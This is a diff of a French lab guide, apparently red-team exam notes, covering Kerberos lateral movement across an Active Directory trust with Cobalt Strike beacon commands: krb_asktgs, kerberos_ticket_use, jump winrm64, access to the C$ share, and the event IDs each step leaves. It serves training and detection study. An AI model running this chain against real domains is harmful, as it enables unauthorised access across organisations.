@@ -279,7 +279,7 @@ Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOS
 
     > **Pourquoi `rsteel` ?** Il appartient au groupe **Partner Jump Users**, relié à PARTNER par FSP. L’événement 4662 peut être journalisé lors d’une opération de réplication, selon la politique d’audit.
     >
-    > Journal d’événements : **4662** on `lon-dc-1` — Directory Service access, Properties: `DS-Replication-Get-Changes-All`
+    > Journal d’événements : **4662** sur `lon-dc-1` — accès au service d’annuaire, propriété : `DS-Replication-Get-Changes-All`
 
 3. **OPSEC-🟠CAUTION** — Demander un TGT pour `rsteel` au KDC CONTOSO.
 
@@ -293,7 +293,7 @@ Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOS
     >
     > **Sortie :** conserver le ticket Base64 du lab pour les étapes suivantes.
     >
-    > Journal d’événements : **4768** (AS-REQ) on `lon-dc-1`
+    > Journal d’événements : **4768** (AS-REQ) sur `lon-dc-1`
 
 4. **OPSEC-🟠CAUTION** — Demander un ticket de référence inter-realm.
 
@@ -307,7 +307,7 @@ Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOS
     >
     > **Sortie :** ticket Base64 réutilisé dans les étapes suivantes du lab.
     >
-    > Journal d’événements : **4769** (TGS-REQ for `krbtgt/partner.com`) on `lon-dc-1` — événement lié à une demande Kerberos inter-realm.
+    > Journal d’événements : **4769** (TGS-REQ pour `krbtgt/partner.com`) sur `lon-dc-1` — événement lié à une demande Kerberos inter-realm.
 
 5. **OPSEC-🟠CAUTION** — Demander un ticket de service CIFS pour `par-jmp-1` auprès de PARTNER.
 
@@ -315,18 +315,18 @@ Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOS
     beacon> krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
     ```
 
-    > TGS-REQ sent to **PARTNER's KDC** (`/dc:par-dc-1.partner.com` — critical, must point at PARTNER, not CONTOSO). PARTNER's KDC:
-    > 1. Decrypts inter-realm TGT with the trust key → validates it came from CONTOSO
-    > 2. Reads rsteel's PAC → sees `-6102` (Partner Jump Users)
-    > 3. Resolves FSP: `-6102` → member of "Contoso Users" (`-1104`)
-    > 4. Adds `-1104` to rsteel's PAC in the new ticket
-    > 5. Issues CIFS service ticket encrypted with par-jmp-1's machine account key
+    > La requête TGS-REQ est adressée au **KDC PARTNER** (`/dc:par-dc-1.partner.com`). Dans le scénario, ce KDC :
+    > 1. Déchiffre le TGT inter-realm avec la clé de confiance et valide son origine CONTOSO.
+    > 2. Analyse le PAC de `rsteel` et le SID `-6102` (Partner Jump Users).
+    > 3. Résout le FSP reliant `-6102` au groupe **Contoso Users** (`-1104`).
+    > 4. Prend en compte l’appartenance au groupe `-1104` lors de la création du ticket.
+    > 5. Délivre un ticket de service CIFS protégé par la clé du compte machine `par-jmp-1`.
     >
-    > **Ticket obtenu :** `SERVICE TICKET` for `cifs/par-jmp-1.partner.com` — PAC contains `-1104` which GPO maps to local Administrators.
+    > **Ticket obtenu :** `SERVICE TICKET` pour `cifs/par-jmp-1.partner.com` — le PAC référence le groupe `-1104`, auquel la GPO associe des permissions locales.
     >
-    > **Save the base64 output** — decode to `rsteel_cifs.kirbi`.
+    > **Fichier de sortie :** `rsteel_cifs.kirbi`, obtenu à partir de la valeur Base64.
     >
-    > Journal d’événements : **4769** on `par-dc-1` — first event generated on PARTNER infrastructure.
+    > Journal d’événements : **4769** sur `par-dc-1` — événement enregistré dans l’infrastructure PARTNER.
 
 5b. **OPSEC-🟠CAUTION** — Demander également un ticket HTTP pour le scénario WinRM.
 
@@ -334,13 +334,13 @@ Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOS
     beacon> krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
     ```
 
-    > `jump winrm64` authenticates over WinRM using the **`http` SPN**, not `cifs`. If you only inject the CIFS ticket and then run `jump winrm64`, you get error `0x8009030e` — "A specified logon session does not exist" — because Kerberos cannot find a ticket for `http/par-jmp-1.partner.com` in the session.
+    > WinRM utilise généralement le SPN **`http`**, contrairement aux accès SMB basés sur `cifs`. Dans ce lab, une session dépourvue du ticket adapté peut rencontrer l’erreur `0x8009030e`.
     >
-    > **Same inter-realm ticket is reused** — no extra DCSync or TGT needed, just a second `krb_asktgs` call with `http` instead of `cifs`.
+    > **Ticket inter-realm :** le scénario utilise ce ticket pour examiner deux services distincts, `cifs` et `http`.
     >
-    > **Save the base64 output** — decode to `rsteel_http.kirbi`.
+    > **Fichier de sortie :** `rsteel_http.kirbi`, obtenu à partir de la valeur Base64.
     >
-    > Journal d’événements : **4769** on `par-dc-1`
+    > Journal d’événements : **4769** sur `par-dc-1`
 
 6. **OPSEC-🟢SAFE** — Décoder les fichiers `.kirbi` sur l’Attacker Desktop.
 
@@ -365,12 +365,12 @@ Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOS
     beacon> run klist
     ```
 
-    > `kerberos_ticket_use` wires the `.kirbi` into the beacon's active Kerberos logon session. Without this step, the beacon's SMB stack uses its existing token identity (SYSTEM or low-priv user) and ignores the Kerbeus-obtained ticket entirely.
+    > `kerberos_ticket_use` charge le fichier `.kirbi` dans la session Kerberos active du Beacon. Sans import, les connexions utilisent le contexte d’authentification déjà disponible.
     >
-    > Verify `klist` output shows: `Server: cifs/par-jmp-1.partner.com @ PARTNER.COM`
-    > The `@ PARTNER.COM` confirms the ticket was issued by PARTNER's KDC, not CONTOSO's.
+    > Vérifier que la sortie de `klist` contient : `Server: cifs/par-jmp-1.partner.com @ PARTNER.COM`
+    > Le suffixe `@ PARTNER.COM` indique le domaine de service concerné.
     >
-    > ⚠️ **Exam trap:** Skipping `kerberos_ticket_use` and going straight to `ls` will give `ERROR_ACCESS_DENIED (5)` even though `krb_asktgs` returned a valid ticket.
+    > ⚠️ **Point d’attention :** un ticket obtenu mais non disponible dans la session utilisée peut provoquer `ERROR_ACCESS_DENIED (5)` lors d’un accès SMB.
 
 8. **OPSEC-🟢SAFE** — Vérifier l’accès SMB à `par-jmp-1` dans le lab.
 
@@ -378,9 +378,9 @@ Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOS
     beacon> ls \\par-jmp-1.partner.com\c$
     ```
 
-    > Service ticket is presented to par-jmp-1 over SMB. par-jmp-1 decrypts with its machine account key, reads the PAC, sees "Contoso Users" (-1104), maps to local Administrators via GPO — access granted.
+    > Lors d’une authentification SMB, le serveur valide le ticket de service et les autorisations associées aux groupes présents dans le PAC. Le résultat dépend de la GPO et des droits effectifs.
     >
-    > Journal d’événements : **4624 Type 3** (network logon) on `par-jmp-1` — normal admin SMB, no lateral movement artefact.
+    > Journal d’événements : **4624 type 3** (connexion réseau) sur `par-jmp-1` — authentification SMB dans le lab.
 
 9. **OPSEC-🟢SAFE** — Étudier le Lateral Movement vers `par-jmp-1` avec WinRM.
 
@@ -390,11 +390,11 @@ Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOS
     beacon> jump winrm64 par-jmp-1.partner.com smb
     ```
 
-    > Inject the HTTP ticket, then `jump winrm64`. WinRM authentication uses the `http` SPN — this ticket gives Kerberos auth across the trust boundary. CS injects a beacon into `wsmprovhost.exe` on par-jmp-1 and connects back over the SMB listener named pipe.
+    > Dans le scénario, WinRM utilise un ticket lié au service `http`. La connexion du Beacon distant est ensuite représentée par le mécanisme Cobalt Strike décrit dans le lab.
     >
-    > ⚠️ **Exam trap:** If you only injected the CIFS ticket and run `jump winrm64`, you get `0x8009030e` — logon session error. You need BOTH tickets: `cifs` for `ls`/`download`, `http` for `jump winrm64`.
+    > ⚠️ **Point d’attention :** les tickets `cifs` et `http` correspondent à des services différents. Un ticket absent ou inadapté au service peut provoquer une erreur de connexion Kerberos.
     >
-    > Journal d’événements : **4624 Type 3** on `par-jmp-1` — WinRM network logon from rsteel. No service created, no Event 7045.
+    > Journal d’événements : **4624 type 3** sur `par-jmp-1` — connexion réseau WinRM du compte `rsteel`.
 
 10. **Nettoyage** — OPSEC-🟢SAFE.
 
@@ -403,7 +403,7 @@ Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOS
     beacon> rev2self                            // drop dyork impersonation token
     ```
 
-⚠️ In this lab, you have taken advantage of legit access assigned across a one-way inbound trust. The entire chain — DCSync → 3-ticket Kerberos referral → SMB access → WinRM lateral move — generates events only in CONTOSO (4662, 4768, 4769) and one network logon event on par-jmp-1. No process creation, no service installation, no disk writes on the target.
+⚠️ **Bilan du lab :** cette relation de confiance entrante permet d’étudier le cheminement Kerberos entre CONTOSO et PARTNER, ainsi que les événements de sécurité associés (notamment 4662, 4768, 4769 et 4624). Les traces exactes dépendent de la configuration et des opérations réalisées.
 
 ===
 
